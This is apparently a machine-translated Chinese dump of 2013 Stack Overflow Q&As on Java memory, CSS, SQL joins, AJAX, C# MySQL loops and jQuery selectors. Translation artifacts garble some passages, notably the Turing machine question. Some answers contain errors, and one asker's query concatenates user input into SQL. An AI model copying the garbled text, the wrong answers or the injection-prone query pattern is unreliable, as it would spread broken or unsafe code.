![在此处输入图像描述](../Images/6b1e0ea35f7dd7f586518ec1ee5b9191.png)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T05:43:14.507

```
java.lang.OutOfMemoryError OpenCV Error: Insufficient memory 
```

您似乎正在将大文件加载到内存中。尝试[使用 -Xms 和 -Xmx 设置增加内存](http://javahowto.blogspot.com/2006/06/6-common-errors-in-setting-java-heap.html)。

如果您的内存大于文件大小，则可能的原因可能是一些内存泄漏。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T05:44:49.083

您需要分配至少 6220800 字节（即 ~6mb）。
使用这些 jvm 设置运行您的 java 应用程序（以分配更多堆大小）：

```
java myapp.jar -Xms10m -Xmx10m 
```

对于日食：

```
Windows Preferences -> java -> Installed JREs:
Select JRE/JDK you are using
Click Edit
Set VM arguments: -Xms10m -Xmx10m
Start your app again. 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-13T05:50:49.213

它的症状是 JVM 崩溃或 JVM 中没有用于分配资源的内存。尝试调整程序或增加 JVM 内存

# html - 调整网站小部件宽度和高度 CSS

> ID：14847067
> 
> 赞同：0
> 
> 时间：2013-02-13T05:36:50.860
> 
> 标签：html, css, widget

如何更改添加到页脚底部的每个小部件的宽度和高度。[http://jjabaird.virb.com/](http://jjabaird.virb.com/)

例如，我有 3 个小部件，每个小部件都设置为 320 像素，我希望这三个小部件中的一个为 960 像素，另一个大小不同。

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T05:55:59.977

你是说你没有做那个网站？在我看到的情况下，小部件的宽度为 31.3%，三个小部件加上它们的边距使其达到 100%。

如果你想改变它，你可以通过添加在css中覆盖它`width: 320px !important;`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T06:02:04.753

试试这个

```
.widgets article.widget {
    float: left;
    margin-bottom: 20px;
    margin-right: 15px;
    width: 310px;
} 
```

三个小 部件`310*3=930`等等。`margin-right:15px;` `15*2=30``930+30= 960`

第三个小部件给出 float:right;

```
<article class="widget blank" style="float: right;">
                <h2>Bleh 2</h2>
                <p>testing testing testing</p>

            </article> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-13T06:03:57.417

在你的代码中

```
<div class="wrapper">            
        <article class="widget rss">
        </article>
        <article class="widget blank">
            <h2>Bleh</h2>
            <p>Testing Testing Testing</p>
        </article>
        <article class="widget blank">
            <h2>Bleh 2</h2>
            <p>testing testing testing</p>
        </article>            
    </div> 
```

和CSS：

```
.wrapper { 
    max-width: 960px; 
    padding: 0; 
    margin: 0 auto;
 }

.widgets article.widget { 
    margin-bottom: 20px;
     width: 31.3%; 
    float: left; 
} 
```

包含 div`wrapper`的最大宽度为 960px .. 同时它包含的每个小部件的宽度为 31% .. 所以如果你将第一个小部件的宽度更改为 320px .. 那么另外两个将向下碰撞.. （b / c它们都设置为`float: left`）..所以你想要做的是将第一个的大小增加到320px，但还要调整其他两个的大小，使它们足够小以包含在包装器div中

即宽度的总和必须 <= 960px .. （在进行计算时，您还必须考虑小部件的边距和填充）

但如果你只是将第一个小部件的宽度更改为 320px 并保留其他两个.. 你最终会得到 (320px + .31(960) + .31(960)) > 960

希望这可以帮助

# python - 有没有关于覆盖 django ModelAdmin 的更好的文档

> ID：14847071
> 
> 赞同：1
> 
> 时间：2013-02-13T05:37:17.070
> 
> 标签：python, django

我想使用 django Admin 端作为我网站的主要应用程序。我想像这里一样覆盖 ModelAdmin 中可用的方法

[https://docs.djangoproject.com/en/dev/ref/contrib/admin/](https://docs.djangoproject.com/en/dev/ref/contrib/admin/)

对于那些带有示例的方法，是否有更好的教程可用

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T08:18:20.857

关于 ModalAdmin 的最佳和最准确的信息[来源是 BaseModelAdmin 和 ModelAdmin 的源代码](https://github.com/django/django/blob/1.4.3/django/contrib/admin/options.py#L60)。

# android - android : 在 webview 中获取视频的当前位置

> ID：14847076
> 
> 赞同：1
> 
> 时间：2013-02-13T05:37:42.450
> 
> 标签：android, webview, video-streaming

我正在 webview 中播放 youtube 视频。在我的应用程序中，我已经覆盖了 webview 的 ontouch。所以当用户点击 webview 播放视频时，它会打开另一个全屏 webview 。现在这里的视频从头开始。取而代之的是，有一种方法可以获取视频的当前位置并从新 web 视图中的该点开始播放。即我在视频视图中寻找与getCurrentposition 和seekto 等价的东西。

请让我知道这是否可行或有任何解决方法。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:34:09.997

我以前做过这个，我警告你将来事情可能会变得一团糟！无论如何，看看android中webview的“JavaScriptInterface”。这是一个[链接](http://ganeshtiwaridotcomdotnp.blogspot.com/2011/09/android-javascriptinterface-tutorial.html)

还可以看看[google 的 youtube player](https://developers.google.com/youtube/android/player/)

有 Android youtube 播放器以及使用 javascript/iframe 等的播放器。

# computer-science - 不经意间的图灵机是如何工作的？

> ID：14847080
> 
> 赞同：11
> 
> 时间：2013-02-13T05:38:02.787
> 
> 标签：computer-science, turing-machines

我正在阅读《**计算复杂性：一种现代方法》一书，但在理解****遗忘的图灵机**时遇到了问题。

不经意的图灵机 (TM) 就是这样一种 TM，其头部的运动完全由**输入的长度**决定。也就是说，TM 忽略了它的输入。到目前为止，一切都很好。

但其中一项练习是证明以下定理：

```
If a language L is decidable in time T(n) 
then there exists an oblivious TM that decides L in time O(T(n)^2). 
```

很明显，不经意的 TM 不能对原始输入进行操作，`L`而是在某个*编码*版本上操作。也就是说，该定理的要点是将位**串***编码*为**整数**（遗忘 TM的输入长度）。但是，如果想要将 (bitstrings) 的一组可能输入编码为整数，那么由于存在length的位串，因此会很快遇到非常高的数字。****`L``2^n``n`****

 ****我是否正确理解了这个问题？你如何证明这个定理？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-08T23:01:44.077

在这里，我建议你阅读这篇论文。这是一篇相当有趣且精彩的论文，它将在要求的较低时间范围内为您提供证明。（我认为您应该能够将其定义为 O(N^2) 或者您可以得出结论 O(N*log(N)) 在技术上是 O(N^2) 但直接遵循这个证明可能会让您的教授感到不安。我想他打算让你以不同的方式处理它。

编辑：

该论文的原始链接不再有效。这是另一个公开发布的。

[http://www-dev.ccs.neu.edu/home/viola/classes/papers/PippengerF-Oblivious.pdf](http://www-dev.ccs.neu.edu/home/viola/classes/papers/PippengerF-Oblivious.pdf)

“复杂性度量之间的关系”，Michael J. Fischer 和 Nicholas Pippenger，1979 年。****

# html - CSS 样式覆盖在移动浏览器上不起作用

> ID：14847082
> 
> 赞同：1
> 
> 时间：2013-02-13T05:38:05.573
> 
> 标签：html, css, mobile-browser

这是我在css中的代码。它覆盖了在 HTML 文件中编写的样式。我无权更改 HTML。

```
body[style] {
    background-color: yellow !important ;
    background: solid;
} 
```

在桌面 Chrome 上，背景变为黄色就好了。不适用于 iPhone 上用于 Safari 的移动 Chrome。

```
<body bgcolor="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" style="margin-left: auto; margin-right: auto; width: 900px;"> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:01:04.157

请`bgcolor="#000000"`从您的`body`元素中删除，一切都会正常工作。

# jquery - 滑块更改值移动滑块处理程序而不是容器

> ID：14847085
> 
> 赞同：0
> 
> 时间：2013-02-13T05:38:14.707
> 
> 标签：jquery, jquery-ui, uislider

在我的函数中，通过调整容器的大小，我调用了一个自定义触发函数，它可以正常工作并且正确移动我的把手，但容器边距不会触发，它保持默认状态。

我的代码有什么问题..？任何人都帮我解决这个问题。

我的代码：

```
var stepScrollBar = $(stepRange).slider({
            step:1, //100 is available movement measure
            slide:function(i,ui){
                boardHolder.css({
                    left:-ui.value * (moveSize / 100)
                });     
            },
            change:function(i,ui){
                boardHolder.css({
                    marginLeft:-ui * (moveSize / 100)
                }); 
            }

        });
        $(stepRange).slider('option','value',65); 
           //value sets in handler but not container being unchanged!
        $(stepRange).slider('option','change').call(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-14T05:49:40.843

这解决了我的问题：

```
$(stepRange).slider('value',getPoint(pointOfLeft));
$(stepRange).on('slidechange', function(event,ui){
    boardHolder.css({
        left:-ui.value * (moveSize / 100)
        }); 
}); 
```

# stored-procedures - 如何将 Datatable 作为 Ref_Cursor 传递给 Oracle 过程？

> ID：14847090
> 
> 赞同：1
> 
> 时间：2013-02-13T05:38:42.127
> 
> 标签：stored-procedures, odp.net, ref-cursor

如何将数据表作为 Ref_Cursor 传递给 Oracle 过程？我在我的开发框中使用 ODP.NET 和 Oracle 10g 客户端。

# c# - 在 MigraDoc 中设置边缘

> ID：14847092
> 
> 赞同：1
> 
> 时间：2013-02-13T05:38:44.873
> 
> 标签：c#, asp.net, migradoc

在 migraDoc 表中，我完成了 setedge

```
t.SetEdge(0, 0, t.Columns.Count, t.Rows.Count, Edge.Box, BorderStyle.Single, 0.5, Colors.Black) 
```

它为全桌设置了优势。但我不希望桌子第一行的优势。我试过了

```
t.SetEdge(0, 1, t.Columns.Count, t.Rows.Count, Edge.Box, BorderStyle.Single, 0.5, Colors.Black) 
```

但它不起作用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-27T11:59:20.767

设置第一行：

```
table.SetEdge(0, 0, table.Columns.Count, 1, Edge.Box, BorderStyle.Single, 2, Colors.Red); 
```

注意顺序是：colBegin，rowBegin，countCols，countRows

我把它弄得又红又大，以便看得清楚

# macos - 无法让“make”在 OSX 上工作；必须使用'make -f '

> ID：14847093
> 
> 赞同：1
> 
> 时间：2013-02-13T05:38:47.323
> 
> 标签：macos, makefile

我正在尝试开始构建自己的 make 文件，但是在让我的 Mac 使用它们时遇到了一些麻烦。我可以发出命令`make -f makefile.txt`，它可以很好地编译我的项目；但是，仅使用`make`会产生以下结果：

```
make: *** No targets specified and no makefile found.  Stop. 
```

我的生成文件如下所示：

```
all:
        g++ main.c -o hello 
```

难道我做错了什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-13T05:41:46.007

您不恰当地命名 Makefile。它应该简单命名`Makefile`（没有扩展名），而不是`makefile.txt`.

# sql - 使用 GroupBy 函数从两个表中选择查询

> ID：14847100
> 
> 赞同：1
> 
> 时间：2013-02-13T05:39:29.577
> 
> 标签：sql, oracle, oracle11g

我正在使用 Oracle APEX，我对如何制作它的查询有点困惑。我创建了两个具有以下属性的表

```
Employees(  "EMP_ID", 
    "EMP_NAME", 
    "EMP_DESIGNATION" , 
    "EMP_ADDRESS" , 
    "EMP_GENDER", 
    "EMP_CONTACT", 
    "EMP_EMAIL" , 
    "EMP_JOINING_DATE", 
     CONSTRAINT "PK_EMP_ID" PRIMARY KEY ("EMP_ID") ENABLE
   );` 
```

和

```
Attendance
(   ATT_ID, 
    EMP_ID, 
    ATT_STATUS, 
    ATT_IN DATE, 
    ATT_OUT DATE, 
    ATT_COMMENTS, 
CONSTRAINT "PK_ATT_ID" PRIMARY KEY ("ATT_ID") ENABLE
CONSTRAINT "FK_EMP_ID" FOREIGN KEY ("EMP_ID") REFERENCES "EMPLOYEES" ("EMP_ID")); 
```

我已经减去了`Att_Out`从`Att_In`得到的时间（以分钟为单位），然后`multiply`它`.69`是员工每分钟的工资，如查询图所示。

```
select emp_id,sum(((att_out-att_in)*1440)*.69) as "minutes*sal/m" 
from attendance group by emp_id; 
```

![在此处输入图像描述](../Images/5872bf325abb5155e4c3b34cbf9a0006.png)

如上所述，我想`select EMP_ID,EMP_NAME`从表中提取其余查询。`Employees`我做了，`INNER JOIN`但后来`group by`功能给了我错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T05:45:10.343

试试这个

```
SELECT e.emplid, e.emp_name,  
sum(((a.att_out-a.att_in)*1440)*.69) as "minutes*sal/m"
FROM Employees e 
inner join attendance a on e.emplid = a.emplid
group by e.emplid, e.emp_name 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T05:47:28.040

尝试以下查询

```
select emp_id,sum(((att_out-att_in)*1440)*.69) as "minutes*sal/m" from attendance a,employees e 
where e.emp_id=a.emp_id
group by emp_id; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T05:49:43.620

```
SELECT e.emp_id, e.emp_name, sum(((a.att_out-a.att_in)*1440)*.69) as "minutes*sal/m" 
FROM Employees e 
inner join attendance a on e.emp_id = a.emp_id 
group by e.emp_id, e.emp_name; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-14T11:21:08.407

这可能对您有帮助：

```
SELECT e.emplid, e.emp_name,  
sum(((a.att_out-a.att_in)*1440)*.69) as  employees_salary_per_minute
FROM Employees e 
inner join attendance a on e.emplid = a.emplid
group by e.emplid, e.emp_name 
```

# javascript - Ajax 函数在循环中挂起

> ID：14847101
> 
> 赞同：0
> 
> 时间：2013-02-13T05:39:31.487
> 
> 标签：javascript, html, ajax, loops

我在一个循环遍历数组的html页面中有一个小脚本，它运行一个ajax函数来检查文件是否存在，如果它是......它会从数组中打印一个数字；如果不是，它会打印 0。问题是它在第一次迭代后就挂起（浏览器只是一直在那里加载）。有没有办法关闭连接？我对 Ajax 比较陌生，所以感谢您的帮助。

```
<!DOCTYPE html>
<html>
<head>
<script type="text/javascript">                                                                                                                                        
var cnt = 0;                                                                                                                                         
var getNum;
var num = [25, 15, 24, 16, 23, 17, 22, 18, 21, 19, 20];
var response = 1;

function getAjax(sales, cnt, getNum){

    loadDoc(response);

    if(response == 1 )
    {

        if(cnt >= 11)
        {
            cnt = 0; 
        }
        else
        {
            cnt++;
        }
        getNum = num[cnt];
    }
    else{
        getNum = 0;
    }

    document.write(getNum + '<br/>');
}

function loadDoc(response)
{
    var xmlhttp;
    if (window.XMLHttpRequest)
    {// code for IE7+, Firefox, Chrome, Opera, Safari                                                                                                                  
        xmlhttp=new XMLHttpRequest();
    }
    else
    {// code for IE6, IE5                                                                                                                                              
        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
    }
    xmlhttp.onreadystatechange=function()
    {
        if (xmlhttp.readyState==4 && xmlhttp.status==200)
        {
            response = 1;
        }
        else
        {
            response = 0;
        }
    }
    xmlhttp.open("GET","randomFile.js",true);
    xmlhttp.send();
}

function runIt(num, cnt, getNum, response){
   setTimeout('getAjax(num, cnt, getNum)', 3000);
}

</script>
</head>
<body>
  <div id="alert"></div>
  <button type="button" onclick="runIt(num, cnt, getNum, response)">Change Content</button>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T05:51:40.827

XMLHttpRequest 是异步的。这意味着这里的一切

```
xmlhttp.onreadystatechange=function()
{
    if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
        response = 1;
    }
    else
    {
        response = 0;
    }
} 
```

在发出请求**后**运行一段时间。进一步来说：

```
...
loadDoc(response);

// the XMLHttpRequest might not have finished within this gap

if(response == 1 ) // <----- response might have not been updated yet
... 
```

因此，如果您立即检查`response`，它可能尚未更新。相反，所有需要运行的依赖于响应的东西都应该放在上面显示的回调函数中。这包括您的计数器递增逻辑。

`response`此外，您将变量传递给`loadDoc`，这没有任何作用，因为`response`它已经是一个全局变量。

# c++ - ATM机器编程挑战

> ID：14847102
> 
> 赞同：2
> 
> 时间：2013-02-13T05:39:31.847
> 
> 标签：c++, visual-studio-2010

请看下面的代码

```
#include <iostream>
#include <iomanip>

using namespace std;

int main()
{
    double balance=0;
    int withdraw = 0;
    double const bankCharges = 0.5;

    cin >> withdraw >> balance;

    if(withdraw%5==0 && balance>(withdraw+bankCharges))
    {
        cout << fixed << setprecision(2) << ((balance)-(withdraw+bankCharges)) << endl;
    }
    else if(withdraw%5!=0 || withdraw>balance)
    {
        cout << fixed <<setprecision(2) << balance << endl;
    }

    return 0;

} 
```

创建上面的代码是为了解决以下挑战

[http://www.codechef.com/problems/HS08TEST](http://www.codechef.com/problems/HS08TEST)

如您所见，我的代码提供了正确的答案。但是测试引擎说“错误答案”！！！！为什么？请帮忙！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-13T05:52:43.067

如果有可能到达那里，千万不要在没有条件的情况下离开`if`,`else if`块。`else`将`else`条件添加到您的代码中。

```
if(withdraw%5==0 && balance>(withdraw+bankCharges))
{
    cout << fixed << setprecision(2) << ((balance)-(withdraw+bankCharges)) << endl;
}
else if(withdraw%5!=0 || withdraw>balance)
{
    cout << fixed <<setprecision(2) << balance << endl;
}
else
{
   //Do something
} 
```

# php - 这个 Ajax/Javascript 代码有什么问题？

> ID：14847110
> 
> 赞同：1
> 
> 时间：2013-02-13T05:40:35.367
> 
> 标签：php, javascript, ajax

我正在尝试执行一项功能，该功能将在单击按钮时显示时钟，但我无法显示时钟。我对这些东西有点陌生，非常感谢一些帮助，以及对我做错了什么的解释。

提前致谢！

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01
Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<script>

function getXMLHTTPRequest() {
try {
req = new XMLHTTPRequest();
} catch(err1) {
    try {
    req = new ActiveXObject("Msxml2.XMLHTTP");
    } catch (err2) {
        try {
        req = new ActiveXObject("Microsoft.XMLHTTP");
        } catch (err3) {
            req = false;
        }
    }
}
return req; 
}

var http = getXMLHTTPRequest();

function getServerTime() {
    var myurl = 'telltimeXML.php';
myRand = parseInt(Math.random()*9999999999999);
var modurl = myurl+"?rand="+myRand;
http.open("GET", modurl, true);
http.onreadystatechange = useHttpResponse;
http.send(null);
}

function useHttpResponse() {
    if (http.readyState == 4) {
        if(http.status == 200) {
            var timeValue = http.responseXML
    .getElementsByTagName("timenow")[0];
        document.getElementById('showtime').innerHTML
        =timeValue.childNodes[0].nodeValue;
        }
    }
    else {
        document.getElementById('showtime').innerHTML = '<img src="anim.gif">';
    }
}
</script>

<title>Ajax</title>
<style>
.displaybox {
width:150px;
background: #ffffff;
border:2px solid #000;
padding:10px;
font:24px normal verdana, helvetica, arial, sans-serif;
margin: 0 auto;
}
</style>
</head>

<body style="background-color:#cccccc; text-align:center">
<h1>Ajax</h1>
<h2>Hamta tiden fran servern utan att uppdatera sidan</h2>
<form>
<input type="button" value="Hamta tiden fran servern" />
</form>
<div id="showtime" class="displaybox"></div>
</body>
</html> 
```

这是 .PHP 代码.. (telltimeXML.php)

```
<?php
header('Content-Type: text/xml');
echo "<?xml version=\"1.0\" ?><clock1><timenow>"
.date('H:i:s)."</timenow></clock1>";
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T05:44:49.830

您错过了关闭 telltimeXML.php 文件中的**' in date 函数。替换此：**

```
 header('Content-Type: text/xml');
 echo "<?xml version=\"1.0\" ?><clock1><timenow>".date('H:i:s)."</timenow></clock1>"; 
```

和

```
 header('Content-Type: text/xml');
 echo "<?xml version=\"1.0\" ?><clock1><timenow>".date('H:i:s')."</timenow></clock1>"; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T19:23:21.897

我认为您在此行末尾缺少一些括号：

http.onreadystatechange = useHttpResponse;

# background - 如何在 RAP 应用程序中添加背景图像？

> ID：14847118
> 
> 赞同：1
> 
> 时间：2013-02-13T05:41:21.027
> 
> 标签：background, rcp

在 RCP 应用程序中，我可以使用 SWT 和窗口构建器轻松添加背景图像。但是如何为 RAP 应用程序添加背景图像？谁能帮我举个简单的例子？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T06:08:17.043

```
 Button-CheckIcon:selected {
    background-image: url( images/check-selected_red.png );
 } 
```

您可以在[此链接中查看详细信息](http://www.codeaffine.com/2012/08/14/rap-adapt-your-style/)

# javascript - 如何在 CSS 中自动调整宽度，以便水平滚动条会自动调整而不会占用太多空间？

> ID：14847119
> 
> 赞同：0
> 
> 时间：2013-02-13T05:41:24.660
> 
> 标签：javascript, html, css

我正在寻找一种`(500px, 200px)`自动调整容器内列表宽度的方法。我想要实现的是这样的 [小提琴](http://jsfiddle.net/x3QWS/)

但它的问题是您需要设置列表的宽度，以便出现水平滚动条。是否有解决方法以使滚动条只占用足够的空间？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T06:26:58.013

试试这个：

```
#container ul {white-space: nowrap;} 
```

# asp.net - 获取控件的客户端ID

> ID：14847128
> 
> 赞同：1
> 
> 时间：2013-02-13T05:42:01.803
> 
> 标签：asp.net, .net, string

我得到下拉值的客户端 ID 为

```
 ctl00_TimecardContentPlaceHolder_UC_0_1_drpdwnCompany 
```

我已经从上面的字符串值中获得了值，因为它`1`仅来自该客户端 ID。

任何类似的方法`substring()`都可以专门从该字符串中获取该值。

## 解决方案

```
 GetClientIdFromConrol(Control control) 
  { 
       string strId=control.ClientID; 
       string strClientsId = strId.Substring(38, 1); 
       return Convert.ToInt32(strClientsId); 
  } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-13T05:53:15.663

如果你只想得到1。

你可以使用`split`函数来完成这项工作。

```
string dropdown="ctl00_TimecardContentPlaceHolder_UC_0_1_drpdwnCompany";
string[] split=dropdown.split('_');//split by underscore character;

string result=split[4].ToString(); // Here you will get 1 to the result 
```

希望这可以帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-13T05:55:59.883

`ID`不使用`ClientID`。

另请参阅[Control.ClientIDMode 属性](http://msdn.microsoft.com/en-us/library/system.web.ui.control.clientidmode.aspx)

# c# - 循环只循环一次，请帮忙找解决办法 C#, MySQL

> ID：14847129
> 
> 赞同：0
> 
> 时间：2013-02-13T05:42:07.017
> 
> 标签：c#, mysql, loops

我试图在一个循环中执行 mysql 查询，每次都会得到新的结果。我面临的问题是，循环仅第一次成功循环，第二次循环成功。这意味着如果它的 idcount 为 5，它只会变为 1，当它进入 2 时，就会出现错误。

**在调用 Read() 之前访问字段的尝试无效，**
它位于这一行“ *string result2 = mysqlReader5[0].ToString();* ”

如果你能帮助我使这个循环成功，你会很好

提前感谢。

```
for (int i = 0; i < idcount; i++)
    {
        connection.Open();

        string x = idarray[i];

        ImageLoop img = new ImageLoop();
        image[i] =img.imageloop(x);

        MySqlCommand mysqlCmd5 = new MySqlCommand("SELECT  image  FROM useralbum where user_id='" + x + "' LIMIT 0,1;", connection);

        MySqlDataReader mysqlReader5 = mysqlCmd5.ExecuteReader();

        while (mysqlReader5.Read())
        {

        }
        string result2 = mysqlReader5[0].ToString();

        image[i] = result2;

        connection.Close();
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-13T05:43:51.013

您正在 while 循环之外访问阅读器，它应该在里面。像：

```
while (mysqlReader5.Read())
    {
    string result2 = mysqlReader5[0].ToString();
    image[i] = result2;
    } 
```

`image[i]`也应该在while循环内完成分配。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-13T05:46:17.793

您应该访问 while 块内的值

```
while (mysqlReader5.Read())
{
// this block is getting executed while there are records
}
string result2 = mysqlReader5[0].ToString(); 
```

此外，如果您可以使用[`Using`](http://msdn.microsoft.com/en-us/library/yh598w02%28v=vs.80%29.aspx)块并将 for 循环移到内部会更好，这样您就可以避免每次打开和关闭连接。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-13T05:56:43.103

而不是使用while，首先检查的值`mysqlReader5.Read()`

```
if (mysqlReader5.Read())
{
   string result2 = mysqlReader5[0].ToString();
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-13T05:55:27.077

我认为您需要更改您的实施....尝试此链接以供参考

[http://csharp-station.com/Tutorial/AdoDotNet/Lesson04](http://csharp-station.com/Tutorial/AdoDotNet/Lesson04)

datareader[0] 返回第一列值。它不用于访问结果数组（使用数据表）。数据读取器不返回结果数组，它一次只获取一个结果。所以你需要读取while内的每个数据（mysqlReader5.Read（））。希望对您有帮助！！！！

# javascript - 从右向左滑动 div 但只有一个 div

> ID：14847134
> 
> 赞同：1
> 
> 时间：2013-02-13T05:42:35.137
> 
> 标签：javascript, jquery, html, css, animation

我正在添加另一个 div，但它不起作用。如果我添加另一个它应该工作：

HTML

```
<div id="siteMap">
  <div id="mapButton">button</div>
  <div id="theMap">content here</div>
</div>
<div id="siteMap" style="margin-top:90px;">
  <div id="mapButton">button</div>
  <div id="theMap">content here</div>
</div> 
```

CSS

```
#siteMap {
  width:200px;
  position:fixed;
  right:-200px;
  top:0px;
  display:block;
  color:#FFF;
  z-index:2;
  opacity: 0.95;
}
#siteMap #mapButton {
  display:block;
  color:#333;
  background-color:#ACACAC;
  padding:2px 5px;
  height:20px;
  width:70px;
  text-align:center;
  position:relative;
  right: 24px;
  margin-top:80px;
  cursor:pointer;
  transform-origin: 0% 0%;
  -ms-transform-origin: 0% 0%;
  -webkit-transform-origin: 0% 0%;
  -moz-transform-origin: 0% 0%;
  -o-transform-origin: 0% 0%;
  transform: rotate(-90deg);
  -ms-transform: rotate(-90deg); 
  -webkit-transform: rotate(-90deg); 
  -moz-transform: rotate(-90deg); 
  -o-transform: rotate(-90deg);
}
#siteMap #theMap {
  width:100%;
  height:100px;
  background-color:#666;
  margin-top:-104px;
} 
```

jQuery：

```
$(document).ready(function() {
  $('#mapButton').click(function() {
    var mapPos = parseInt($('#siteMap').css('right'), 10);
    if (mapPos < 0) {
      $('#siteMap').animate({
        right: '+=200'
        }, 458, 'swing', function() {
          // Animation complete.
      });
    } else {
      $('#siteMap').animate({
        right: '-=200'
        }, 458, 'swing', function() {
          // Animation complete.
      });
    }
  });
}); 
```

如何解决这个问题？即使添加另一个 div，我也需要它来为这些 div 设置动画。

这是[小提琴](http://jsfiddle.net/qGVfp/27/)。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-13T05:48:57.030

当您使用`$('#mapButton')`它时，它会找到具有此类 id 的第一个元素。ID 应该是唯一的。使用类而不是 id。

```
$(document).ready(function () {
  $('.mapButton').click(function () {
    var siteMap = $(this).parent();

    var mapPos = parseInt(siteMap.css('right'), 10);
    if (mapPos < 0) {
      siteMap.animate({
        right: '+=200'
      }, 458, 'swing', function () {
        // Animation complete.
      });
    } else {
      siteMap.animate({
        right: '-=200'
      }, 458, 'swing', function () {
        // Animation complete.
      });
    }
  });
}); 
```

工作演示：http: [//jsfiddle.net/xttaw/](http://jsfiddle.net/xttaw/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-13T05:49:07.500

Id 必须是唯一的，您应该使用类来代替：

```
$('.mapButton').click(function() {
  var mapPos = parseInt($(this).parent().css('right'), 10);
  if (mapPos < 0) {
    $(this).parent().animate({
      right: '+=200'
      }, 458, 'swing', function() {
        // Animation complete.
      });
  }
  else {
    $(this).parent().animate({
      right: '-=200'
      }, 458, 'swing', function() {
        // Animation complete.
    });
  } 
}); 
```

[http://jsfiddle.net/qGVfp/29/](http://jsfiddle.net/qGVfp/29/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-13T05:49:34.973

使用 class 而不是 ids，即使用`class="siteMap"`(`.siteMap`在 CSS 中) 而不是`id="siteMap"`. 并且还利用`$(this).parent()`访问父元素。在此处检查更新的代码：http: [//jsfiddle.net/qGVfp/28/](http://jsfiddle.net/qGVfp/28/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-13T05:50:07.703

在这段代码中

```
<div id="siteMap">
 <div id="mapButton">button</div>
 <div id="theMap">content here</div>
</div>
<div id="siteMap" style="margin-top:90px;">
 <div id="mapButton">button</div>
 <div id="theMap">content here</div>
</div> 
```

你有两次相同的 id`<div id="mapButton">`和 `<div id="siteMap">`

不建议在 HTMl 中多次使用相同的 id。

试着用`css class`写`javascript`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-13T05:47:47.753

每个文档的 id 值必须是唯一的，因此您不能有多个 <div id="siteMap"> 或其他任何东西。

考虑改用类。即 <div class="siteMap"... 等等。相应地更新您的 css 和 jquery 选择器（'.siteMap'）

编辑：试试这个（未经测试）

```
<div class="siteMap">
  <div class="mapButton">button</div>
  <div class="theMap">content here</div>
</div>
<div class="siteMap" style="margin-top:90px;">
  <div class="mapButton">button</div>
  <div class="theMap">content here</div>
</div>

.siteMap {
  width:200px;
  position:fixed;
  right:-200px;
  top:0px;
  display:block;
  color:#FFF;
  z-index:2;
  opacity: 0.95;
}
.siteMap .mapButton {
  display:block;
  color:#333;
  background-color:#ACACAC;
  padding:2px 5px;
  height:20px;
  width:70px;
  text-align:center;
  position:relative;
  right: 24px;
  margin-top:80px;
  cursor:pointer;
  transform-origin: 0% 0%;
  -ms-transform-origin: 0% 0%;
  -webkit-transform-origin: 0% 0%;
  -moz-transform-origin: 0% 0%;
  -o-transform-origin: 0% 0%;
  transform: rotate(-90deg);
  -ms-transform: rotate(-90deg); 
  -webkit-transform: rotate(-90deg); 
  -moz-transform: rotate(-90deg); 
  -o-transform: rotate(-90deg);
}
.siteMap .theMap {
  width:100%;
  height:100px;
  background-color:#666;
  margin-top:-104px;
}

$(document).ready(function() {
  $('.mapButton').click(function() {
    var mapPos = parseInt($(this).parent().css('right'), 10);
    if (mapPos < 0) {
      $(this).parent().animate({
        right: '+=200'
        }, 458, 'swing', function() {
          // Animation complete.
      });
    } else {
      $(this).parent().animate({
        right: '-=200'
        }, 458, 'swing', function() {
          // Animation complete.
      });
    }
  });
}); 
```

# ios - APNS 向所有用户的设备发送通知

> ID：14847138
> 
> 赞同：0
> 
> 时间：2013-02-13T05:43:13.427
> 
> 标签：ios, apple-push-notifications

有什么方法可以让用户在他的所有设备上都能找到一些独特的东西？

我认为设备令牌对于每个设备本身都是唯一的，而不是用户？

那么是否有可能唯一标识一个用户以在我的服务器上记录他的所有设备令牌？还是让用户登录的唯一方法？

*我希望设置是自动的，让用户无需注册/登录即可打开应用程序。*

